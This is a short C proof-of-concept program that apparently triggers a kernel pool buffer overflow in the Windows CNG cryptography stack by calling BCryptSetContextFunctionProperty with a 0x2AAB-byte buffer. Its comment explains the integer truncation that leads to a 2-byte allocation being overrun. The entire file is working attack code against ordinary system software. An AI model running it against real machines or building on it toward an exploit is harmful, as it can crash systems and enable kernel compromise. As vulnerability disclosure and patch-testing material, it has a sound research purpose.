#include <stdio.h>

#include <Windows.h>
#include <Bcrypt.h>

/*
 * Buffer size is multiplied by 6 before being casted to a 16 bit integer
 * passed to BCryptAlloc. BCryptAlloc then calls ExAllocatePoolWithTag with
 * the truncated size.
 *
 * In this example, 0x2AAB results in a allocation of 2 bytes on the
 * non executable paged pool (NonPagedPoolNx).
 * (6 * 0x2AAB) & 0xFFFF = 2
 *
 * Then the user provided buffer is converted to its hexadecimal form using
 * the 64 bits size provided in the IOCTL (0x390400), overflowing the
 * allocated buffer.
 */
#define BUFFER_SIZE 0x2AAB

int main(void)
{
    NTSTATUS    ntStatus;
    UCHAR       Buffer[BUFFER_SIZE];

    RtlZeroMemory(Buffer, sizeof(Buffer));

    ntStatus = BCryptSetContextFunctionProperty(
        CRYPT_LOCAL,
        L"Default",
        BCRYPT_CIPHER_INTERFACE,
        L"AES",
        L"Property",
        sizeof(Buffer),
        Buffer
    );

    if (ntStatus)
    {
        printf(
            "[-] BCryptSetContextFunctionProperty failed with 0x%08X\n",
            ntStatus
        );
    }

    return 0;
}